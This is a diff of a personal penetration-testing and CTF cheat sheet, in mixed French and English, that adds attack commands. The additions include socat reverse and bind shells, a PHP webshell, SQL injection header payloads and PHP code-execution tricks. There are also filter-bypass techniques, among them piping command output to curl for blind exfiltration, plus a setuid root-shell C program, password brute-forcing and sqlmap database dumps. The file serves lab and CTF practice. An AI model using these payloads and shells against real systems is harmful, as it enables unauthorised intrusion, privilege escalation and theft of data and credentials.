@@ -89,76 +89,74 @@ for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "
 
 
 
-sudo nmap -n -Pn -p- -O 192.168.110.54
-sudo nmap -n -Pn -sV -p21,22,80 -O 192.168.110.54
-sudo nmap -n -Pn -sV --script default -p21,22,80 -O 192.168.110.54
-
 
 ## Scan Web services
 
-nikto -h http://192.168.110.54
-gobuster
-    -f, --add-slash
-    -x, --extension
-    -u, --url string
-    -k, --no-tls-validation
-    -w, --wordlist string
+    nikto -h http://192.168.110.54
+    gobuster
+        -f, --add-slash
+        -x, --extension
+        -u, --url string
+        -k, --no-tls-validation
+        -w, --wordlist string
 
     gobuster dir --url 192.168.110.54  --wordlist directory-list-2.3-medium.txt -x html,php,txt -t 20
 
-dirb http://192.168.110.54 -X .php,.txt
-wfuzz
-    -c Output with colors
-    -z payload
-    --hc/hl/hw/hh N[,N]+ : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
-    --sc/sl/sw/sh N[,N]+ : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
-    --ss/hs regex   : Show/hide responses with the specified regex within the content
+    dirb http://192.168.110.54 -X .php,.txt
+    wfuzz
+        -c Output with colors
+        -z payload
+        --hc/hl/hw/hh N[,N]+ : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
+        --sc/sl/sw/sh N[,N]+ : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
+        --ss/hs regex   : Show/hide responses with the specified regex within the content
 
-    wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
-    wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.48/FUZZ/
+        wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
+        wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.48/FUZZ/
 
-ffuf -c -w directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ/
-ffuf -c -w directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
+    ffuf -c -w directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ  -t 100
+    ffuf -c -w directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
+    ffuf -w dirsearch/directory-list-2.3-medium.txt -X POST -d "url=dev/FUZZ.xml" -u http://10.10.10.123/upload.php -H "Cookie: PHPSESSID=j1nanul898l0fbr8bt2vgb548a" -H "Host: vuln.host.com" -H "Referer: http://backup.forwardslash.htb/profilepicture.php" -H "Content-Type: application/x-www-form-urlencoded" -fw 111 -t 300
 
-    -b : Cookie data `"NAME1=VALUE1; NAME2=VALUE2"`
-    -c : Colorize output
-    -w : Wordlist file path
-    -u : Target URL
-    -d : POST data
 
-dirsearch.py -u http://192.168.110.48 -w directory-list-2.3-medium.txt -e txt,php -f -x 400,403,404 
+        -b : Cookie data `"NAME1=VALUE1; NAME2=VALUE2"`
+        -c : Colorize output
+        -w : Wordlist file path
+        -u : Target URL
+        -d : POST data
 
-curl -v http://10.10.10.10/robots.txt
-curl -k -v https://10.10.10.10/robots.txt
-curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt
-curl -v -X OPTIONS http://10.10.10.10/test
+    dirsearch.py -u http://192.168.110.48 -w directory-list-2.3-medium.txt -e txt,php -f -x 400,403,404 
 
-#Identifier les méthodes HTTP autorisées
-curl -X OPTIONS http://example.org -i
+    curl -v http://10.10.10.10/robots.txt
+    curl -k -v https://10.10.10.10/robots.txt
+    curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt
+    curl -v -X OPTIONS http://10.10.10.10/test
+
+    #Identifier les méthodes HTTP autorisées
+    curl -X OPTIONS http://example.org -i
 
 
 ### WordPress
 
-wpscan --url http://192.168.110.54/wp
-wpscan --url http://192.168.110.54/wp --enumerate u
-wpscan --url http://192.168.110.54/wp --usernames users.txt --passwords passwords.txt --password-attack xmlrpc
-wpscan --url http://192.168.110.54/wp --plugins-version-detection aggressive --plugins-detection aggressive  --detection-mode aggressive
+    wpscan --url http://192.168.110.54/wp
+    wpscan --url http://192.168.110.54/wp --enumerate u
+    wpscan --url http://192.168.110.54/wp --usernames users.txt --passwords passwords.txt --password-attack xmlrpc
+    wpscan --url http://192.168.110.54/wp --plugins-version-detection aggressive --plugins-detection aggressive  --detection-mode aggressive
 
 ### Drupal
 
-droopescan
+    droopescan
 
 ### Joomla
 
-joomscan
+    joomscan
 
 
 
 
 ## Identifier les vulnérabilités
 
-sudo nmap -n -Pn -sV --script vuln,exploit -p21,22,80 -O 192.168.110.54
-searchsploit
+    sudo nmap -n -Pn -sV --script vuln,exploit -p21,22,80 -O 192.168.110.54
+    searchsploit
 
 
 
@@ -171,14 +169,48 @@ telnet
 netcat
 ncat
 socat : https://github.com/andrew-d/static-binaries
+    TCP reverse shell
+    listen:
+    socat file:`tty`,echo=0,raw tcp-listen:80
+    exec:
+    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:80
+
+    socat tunnel
+    socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80  
+    socat TCP-LISTEN:8085,fork,reuseaddr TCP:127.0.0.1:65334  
+
+    Stable TTY bind
+    victim:
+    socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane  
+    Connect from local:
+    socat FILE:`tty`,raw,echo=0 TCP:192.168.0.74:1337 
+
+    bind a binary to a port
+    exec socat TCP-LISTEN:31337,fork,reuseaddr EXEC:/home/leak,echo=0,pty,stderr
+      
+    Fork a port:
+    socat TCP-LISTEN:4444,fork TCP:localhost:1337
+
+mitm ipv6 proxy
+ipv4 (capture in burp)
+socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8080
+ipv6:
+socat -v tcp4-listen:5985,reuseaddr,fork tcp6:[dead:babe::1001]:5985
 pwncat
 john
+    ./john password --format=raw-md5  --wordlist=dico --rules
 hashcat
 hash : mimikatz / craclmapexec
  pass de hash
 
 wordslist
 passwords reuse
+
+## nmap
+    
+sudo nmap -n -Pn -p- -O 192.168.110.54
+sudo nmap -n -Pn -sV -p21,22,80 -O 192.168.110.54
+sudo nmap -n -Pn -sV --script default -p21,22,80 -O 192.168.110.54
 
 ## sed
 
@@ -226,6 +258,14 @@ steghide
     steghide info <media filename>
 stepic -d -i kvasir.png | xxd -p -r > k.png
 
+```bash
+#bruteforce
+#!/bin/bash
+for word in ` cat rockyou.txt `
+do
+    steghide extract -sf stego.jpg -p $word
+done
+```
 
 ## tcpdump
 https://danielmiessler.com/study/tcpdump/
@@ -244,6 +284,16 @@ tcpdump portrange 21-23
 
 # Exploit LFI
 
+
+# SQL Injection
+
+    GET
+    POST
+    PUT
+    X-FORWARDED-FOR: 127.0.0.1' or 1=1#
+    User-Agent: aaa' or 1/*
+    Referer: http://www.yaboukir.com
+    Cookie: abbcd' or 't'='t
 
 ## Detection of PHP include
 
@@ -280,6 +330,17 @@ https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 <?php system($_GET["cmd"]); ?>
 
 ```
+
+```bash
+
+<FilesMatch "\.ph(p[2-6]?|tml)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+
+```
+
+
    
 
 ## Path Traversal aka Directory Traversal
@@ -293,6 +354,7 @@ https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 
 
 ## PHP Wrapper php://file
+
 http://192.168.183.128/fileincl/example1.php?page=php://input
 
 Post Data payload, try something simple to start with like: 
@@ -315,7 +377,6 @@ http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-en
     /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc
 
 
-
 # Remote file access
 
     http://vulnerable/index.php?page=http://www.google.com/?
@@ -330,6 +391,113 @@ http://vulnerable/index.php?page=http://yourserver/webshell.txt&cmd=ifconfig
   system($_GET["cmd"]);
 ?>
 ```
+
+## preg_replace
+
+```php
+
+preg_replace("/blabla/e", system('id'), "lorem")
+
+```
+## usort
+
+    ?order=id);%7dsystem(%27ls%20-al%27)
+    ?order=id);}system('uname%20-a');//
+    ?order=id);}system('ls');//
+
+## asert
+
+```php
+assert(trim("'".$_GET['name']."'"));
+```
+
+
+## Fatal errors : https://www.fatalerrors.org/a/summarize-code-execution-and-command-execution.html
+
+    (1).eval() executes the string as a function
+    (2).assert() 
+    (3).call_user_func() 
+    (4).call_user_fuc_array()
+    (5)preg_replace() 
+    (6)array_map() 
+    (7)array_filter
+    (8)usort uses user-defined functions to sort arrays
+    (9)uasort() uses a user-defined comparison function to sort the array values
+    (10) The php code in the middle of ${}
+
+    2. Order execution
+1. Common command execution functions
+
+    (1)system() can execute system commands and output them
+    (2)exec() executes the command, but no output.
+    (3)passthru executes command output
+    (4)shell_exec executes the command without echo
+    (5) Reverse question mark, execute the shell command, and return the output string
+    (6)ob_start turns on the output control buffer
+    
+    
+(1) Common separator
+
+Line break %0a
+Carriage return %0d
+Continuous instruction;
+Background process&
+Pipe symbol|
+Logic&&
+(2) Bypass spaces
+
+    $IFS
+    <
+    ${IFS}
+    $IFS$9
+    $%09
+
+(3) Various symbols
+
+    1 echo "${PATH:0:1}"
+    2 echo "`expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1`"
+    3 echo `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)`
+    4 expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1
+
+    %0a，%0d，%00，%20
+
+(4) Impression character bypass
+
+    Variable bypass: a=l;b=s;$a$b
+ 
+(5) code bypass
+
+    echo 'cat' |base64
+
+(6) Undefined initialization variable
+
+    cat $b /etc/passwd
+
+(7) connector
+
+    cat /etc/pass'w'd
+
+(8) use wildcards
+
+    /???/?s --help
+
+(9) No echo
+
+    Use the delay function, such as: ls|sleep 3
+    Use http, for example: ls|curl ip:port
+    Using DNS
+
+(10) Length bypass
+
+    For example, 15 bit command execution, 7-bit command execution, 5-bit command execution and 4-bit command execution
+    https://xz.aliyun.com/t/1579
+
+(11) Command execution without alphanumeric
+
+    1. Exclusive or
+    2. Reverse
+    3. Self increasing
+
 # Exploit - Remote Commande execution (RCE)
 
     ;
@@ -426,13 +594,16 @@ pspy : https://github.com/DominicBreuker/pspy it allows you to see commands run 
 # Forensics
 
 ```bash
-find / -perm -u=s -type f 2>/dev/null
+
+find / -perm -u=s -type f -ls 2>/dev/null
 find / -perm -g=s -type f 2>/dev/null
 find / -type f -writable 2>/dev/null | grep -v '^/proc'| grep -v '^/sys'
 find / -user root -writable 2>/dev/null | grep -v '/proc' | grep -v '/dev'
 
 find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;
 for file in $(find . -name '*.php'); do cat $file; done
+
+find / -type f -newermt 2020-02-10 ! -newermt 2020-02-28 -ls 2>/dev/null
 
 grep -Er '(preg_replace|phpinfo()|system)' * | grep '.php:'
 
@@ -734,6 +905,20 @@ curl -u user:password http://localhost/Glasgow---Smile2/
 ```
 
 
+# C
+
+```c
+# asroot.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void){
+    setresuid(0, 0, 0);
+    setresgid(0, 0, 0);
+    system("/bin/bash");
+    return 0;
+}
+```
 
 
 # Python
@@ -762,13 +947,17 @@ session = requests.Session()
 url = "http://888.darknet.com/"
 
 response = session.get(url)
-cookies = session.cookies.get_dict()
 
-data = {"username":"devnull' or '1", "password":"xxxxxxxx", "action":"Login"}
-r = session.post(url, data=data, cookies=cookies)
+cookies = session.cookies.get_dict()
+files = {'upload': open('file.txt','rb')}
+data = {"username":"admin", "password":"xxxxxxxx", "action":"Login"}
+headers = {'user-agent': 'my-app/0.0.1'}
+
+r = session.post(url, files=files, data=data, cookies=cookies,  headers=headers)
 url_main  = r.url
 r = requests.get(url_main, cookies=cookies)
 print (r.text)
+
 # cookies = session.cookies.get_dict()
 # print (cookies)
 
@@ -894,18 +1083,18 @@ https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
 
 enum4linux 192.168.110.46
 nmblookup -A 192.168.1.17
+snmp-check 10.10.10.10
 nbtscan 192.168.1.17
 nbtstat -A 192.168.1.17
 smbmap -H 192.168.110.46
 smbmap -H 192.168.110.46 -u helios -p qwerty
-rcpclient
+rpcclient -U "" 10.10.10.10
 
 smbclient -L 192.168.110.46
 smbclient //192.168.110.46/helios
 get file.txt
 
 smbclient //10.10.10.9/share$
-
 
 smbclient //192.168.110.46/helios -U helios
 Enter WORKGROUP\helios's password: 
@@ -947,7 +1136,18 @@ detecte des nom d'utilisateurs ?
 
 # Base de données
 
-sqlmap
+## sqlmap
+
+    sqlmap -u 'http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#'
+    --cookie='PHPSESSID=0e4jfbrgd8190ig3uba7rvsip1; security=low'
+    --string='First name' --dbs --level 3 -p PHPSESSID
+
+    -- string compare between the valid pages and the invalid one 
+    -- dbs is used to enumerate the database 
+    -- p force the testing of the PHPSESSID variable
+    sqlmap --list-tamper
+    sqlmap -u "http://192.168.110.55/" --headers="X-Forwarded-For: *" --dbms=MySQL -D photoblog -T users -C login,password  --batch --dump
+
 
 # SNMP (UDP 161) 
 
